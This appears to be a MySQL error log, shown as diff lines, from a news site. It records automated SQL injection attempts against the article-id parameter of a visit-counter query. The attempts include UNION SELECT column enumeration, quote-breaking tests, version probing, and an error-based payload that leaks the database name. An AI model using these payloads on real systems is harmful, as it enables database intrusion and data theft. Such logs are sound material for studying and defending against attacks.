+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111 UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45) --  /*
+
+Time : 21:22:13
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111 UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45) --  /*
+
+Time : 21:22:13
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111 UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45) --  /*
+
+Time : 21:22:13
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111 UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45) --  /*
+
+Time : 21:22:12
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111 UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45) --  /*
+
+Time : 21:22:12
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111 UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45) --  /*
+
+Time : 21:22:12
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111 UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45) --  /*
+
+Time : 21:22:11
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111 UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45) --  /*
+
+Time : 21:22:11
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111 UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45) --  /*
+
+Time : 21:22:10
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111 UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45) --  /*
+
+Time : 21:22:10
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111 UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45) --  /*
+
+Time : 21:22:10
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45) --  /*' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111 UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45) --  /*
+
+Time : 21:22:09
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION SELECT CHAR(45,120,49,45,81,45) --  /*' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111 UNION SELECT CHAR(45,120,49,45,81,45) --  /*
+
+Time : 21:18:20
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''"' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7722'"
+
+Time : 12:14:29
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '~'chihuahuahoy'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7746 and(select 1 from(select count(*),concat((select (select concat(0x7e,0x27,unhex(Hex(cast(database() as char))),0x27,0x7e)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 12:14:24
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7746 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 12:14:23
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7746 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 12:14:22
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7746 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 12:14:21
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7746 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 12:14:19
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7746 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 12:14:18
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7746 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 12:14:17
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7746 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 12:14:15
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7746 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 12:14:14
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7746 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 12:14:13
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7746 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 12:14:12
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7746 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 12:14:11
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7746 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 12:14:09
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7746 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 12:14:08
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7746 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 12:14:07
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7746 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 12:14:05
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7746 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 12:14:04
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7746 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 12:14:03
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7746 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 12:14:02
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7746 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 12:14:01
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7746 union all select null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 12:13:59
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null--' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7746 union all select null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 12:13:58
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null--' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7746 union all select null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 12:13:57
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null--' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7746 union all select null,null,null,null,null,null,null,null,null,null--
+
+Time : 12:13:56
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null--' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7746 union all select null,null,null,null,null,null,null,null,null--
+
+Time : 12:13:54
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null--' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7746 union all select null,null,null,null,null,null,null,null--
+
+Time : 12:13:53
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null--' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7746 union all select null,null,null,null,null,null,null--
+
+Time : 12:13:52
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null--' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7746 union all select null,null,null,null,null,null--
+
+Time : 12:13:51
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null--' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7746 union all select null,null,null,null,null--
+
+Time : 12:13:50
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null--' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7746 union all select null,null,null,null--
+
+Time : 12:13:48
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null--' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7746 union all select null,null,null--
+
+Time : 12:13:47
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null--' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7746 union all select null,null--
+
+Time : 12:13:46
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null--' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7746 union all select null--
+
+Time : 12:13:45
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select--' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7746 union all select--
+
+Time : 12:13:05
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7746'
+
+Time : 12:13:03
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" and "x"="y' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7746" and "x"="y
+
+Time : 12:13:01
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" and "x"="x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7746" and "x"="x
+
+Time : 12:13:00
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' and 'x'='y' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7746' and 'x'='y
+
+Time : 12:12:59
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' and 'x'='x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7746' and 'x'='x
+
+Time : 11:50:32
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''7746' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id='7746
+
+Time : 10:30:01
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" union select unhex(hex(version())) -- "x"="x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=638499999" union select unhex(hex(version())) -- "x"="x
+
+Time : 10:30:01
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' union select unhex(hex(version())) -- 'x'='x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=638499999' union select unhex(hex(version())) -- 'x'='x
+
+Time : 10:30:00
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union select unhex(hex(version())) -- and 1=1' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6384999999.1 union select unhex(hex(version())) -- and 1=1
+
+Time : 10:30:00
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" or (1,2)=(select*from(select name_const(CHAR(111,108,111,108,111,115,104,101,1' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6384" or (1,2)=(select*from(select name_const(CHAR(111,108,111,108,111,115,104,101,114),1),name_const(CHAR(111,108,111,108,111,115,104,101,114),1))a) -- "x"="x
+
+Time : 10:30:00
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' or (1,2)=(select*from(select name_const(CHAR(111,108,111,108,111,115,104,101,1' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6384' or (1,2)=(select*from(select name_const(CHAR(111,108,111,108,111,115,104,101,114),1),name_const(CHAR(111,108,111,108,111,115,104,101,114),1))a) -- 'x'='x
+
+Time : 10:29:59
+SQLSTATE[HY000]: General error: 1210 Incorrect arguments to NAME_CONST
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=6384 or (1,2)=(select*from(select name_const(CHAR(111,108,111,108,111,115,104,101,114),1),name_const(CHAR(111,108,111,108,111,115,104,101,114),1))a) -- and 1=1
+
+Time : 10:29:54
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45),CHAR(45,120,50,48,45,81,45),CHAR(45,120,50,49,45,81,45),CHAR(45,120,50,50,45,81,45),CHAR(45,120,50,51,45,81,45),CHAR(45,120,50,52,45,81,45),CHAR(45,120,50,53,45,81,45) -- /* order by "as /*
+
+Time : 10:29:53
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45),CHAR(45,120,50,48,45,81,45),CHAR(45,120,50,49,45,81,45),CHAR(45,120,50,50,45,81,45),CHAR(45,120,50,51,45,81,45),CHAR(45,120,50,52,45,81,45) -- /* order by "as /*
+
+Time : 10:29:52
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45),CHAR(45,120,50,48,45,81,45),CHAR(45,120,50,49,45,81,45),CHAR(45,120,50,50,45,81,45),CHAR(45,120,50,51,45,81,45) -- /* order by "as /*
+
+Time : 10:29:51
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
